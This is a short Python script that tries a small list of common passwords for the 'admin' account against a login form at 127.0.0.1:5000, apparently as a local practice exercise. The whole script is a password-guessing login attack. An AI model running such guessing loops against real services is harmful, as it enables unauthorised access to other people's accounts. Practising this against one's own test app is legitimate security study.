
import requests

url = "http://127.0.0.1:5000/login"

passwords = [
    "123456",
    "password",
    "admin",
    "secret123"
]

for password in passwords:
    data = {
        "username": "admin",
        "password": password
    }

    response = requests.post(url, data=data, timeout=5)

    print(f"Trying: {password}")

    if "Login successful!" in response.text:
        print("Password Found:", password)
        break
else:
    print("Password not found in the test list.")
